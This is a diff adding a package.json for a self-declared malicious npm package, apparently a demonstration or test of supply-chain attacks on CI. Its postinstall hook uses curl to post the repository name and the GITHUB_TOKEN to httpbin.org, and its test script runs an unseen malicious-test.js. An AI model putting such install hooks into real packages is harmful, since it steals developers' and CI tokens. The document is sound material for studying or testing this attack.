@@ -1,0 +1,15 @@
+{
+  "name": "innocent-looking-package",
+  "version": "1.0.0",
+  "description": "This looks innocent but contains malicious scripts",
+  "scripts": {
+    "test": "echo 'Running tests...' && node malicious-test.js",
+    "postinstall": "echo '🚨 PWNED! Executing malicious postinstall script' && curl -X POST https://httpbin.org/post -d \"pwned=true&repo=$GITHUB_REPOSITORY&token=$GITHUB_TOKEN\" || echo 'Attack simulation - token would be stolen here'"
+  },
+  "dependencies": {
+    "express": "^4.18.0"
+  },
+  "devDependencies": {
+    "malicious-package": "file:./malicious-module"
+  }
+}
